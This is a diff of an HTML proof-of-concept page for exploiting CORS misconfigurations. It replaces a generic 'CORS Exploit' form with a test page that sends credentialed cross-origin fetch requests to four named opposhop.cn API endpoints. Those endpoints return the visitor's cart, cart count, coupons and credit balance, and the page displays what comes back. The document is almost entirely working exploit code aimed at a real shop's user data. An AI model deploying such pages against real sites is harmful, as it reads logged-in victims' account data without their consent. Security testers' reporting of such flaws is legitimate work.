@@ -1,124 +1,81 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f4f4f9;
-            color: #333;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            flex-direction: column;
-        }
-        h2 {
-            color: #4a90e2;
-        }
-        a {
-            color: #4a90e2;
-            text-decoration: none;
-        }
-        a:hover {
-            text-decoration: underline;
-        }
-        input[type="text"] {
-            padding: 10px;
-            width: 100%;
-            max-width: 500px;
-            margin-top: 10px;
-            border: 2px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        button {
-            padding: 10px 20px;
-            margin-top: 10px;
-            background-color: #4a90e2;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #357ab8;
-        }
-        pre {
-            background-color: #f8f9fa;
-            border: 1px solid #ddd;
-            padding: 15px;
-            width: 100%;
-            max-width: 600px;
-            border-radius: 5px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            margin-top: 20px;
-            color: #2c3e50;
-            font-size: 14px;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-        }
-        .container input {
-            margin-bottom: 10px;
-        }
-        footer {
-            margin-top: 50px;
-            font-size: 14px;
-            color: #999;
-        }
-    </style>
-    <script type="text/javascript">
-        function exploit() {
-            // Get the vulnerable URL from the user input
-            var url = document.getElementById('vulnerableUrl').value;
-            var xhr = new XMLHttpRequest();
+<meta charset="UTF-8">
 
-            // Open a GET request to the provided vulnerable URL
-            xhr.open("GET", url, true);
+<script>
 
-            // Include victim's credentials (cookies, sessions) in the request
-            xhr.withCredentials = true;
+const endpoints = {
+cart: "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+count: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+coupon: "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+credit: "https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
+}
 
-            // When the request completes
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    // If successful, display the response in the 'output' div
-                    if (xhr.status === 200) {
-                        document.getElementById('output').innerText = "Response:\n" + xhr.responseText;
-                    } else {
-                        document.getElementById('output').innerText = "Failed to fetch data from " + url;
-                    }
-                }
-            };
+function handleCorsRequest(type){
 
-            // Send the request
-            xhr.send();
-        }
-    </script>
+for (let name in endpoints){
+
+fetch(endpoints[name],{
+
+method: "GET",
+
+mode: "cors",
+
+credentials: type === "withCredentials" ? "include" : "omit",
+
+headers:{
+"Accept":"*/*",
+"Accept-Language":"en-US,en;q=0.9"
+}
+
+})
+
+.then(res => res.text())
+
+.then(data => {
+
+document.getElementById(`message-${type}`).textContent +=
+"\n\nEndpoint: " + name +
+"\nStatus: SUCCESS\nResponse:\n" + data + "\n"
+
+})
+
+.catch(error => {
+
+document.getElementById(`message-${type}`).textContent +=
+"\n\nEndpoint: " + name +
+"\nStatus: FAILED\nError: " + error.message + "\n"
+
+})
+
+}
+
+}
+
+</script>
+
 </head>
+
 <body>
-    <div class="container">
-        <h2>CORS Exploit Proof of Concept</h2>
-        <h3>Created by <a href="https://www.linkedin.com/in/kunalnamdas">@kunalnamdas</a></h3>
-        <p>Enter the vulnerable URL (including the protocol, e.g., https://):</p>
-        <input type="text" id="vulnerableUrl" placeholder="https://vulnerable-site.com/api" />
-        <button onclick="exploit()">Exploit</button>
 
-        <h2>Result:</h2>
-        <pre id="output"></pre>
-    </div>
+<h3>CORS Test</h3>
 
-    <footer>
-        <p>For educational purposes only. Use responsibly!</p>
-    </footer>
+<button onclick="handleCorsRequest('noCredentials')">
+Cross-origin request Without Credentials
+</button>
+
+<button onclick="handleCorsRequest('withCredentials')">
+Cross-origin request With Credentials
+</button>
+
+<h3>Results</h3>
+
+<pre id="message-noCredentials"></pre>
+
+<pre id="message-withCredentials"></pre>
+
 </body>
+
 </html>
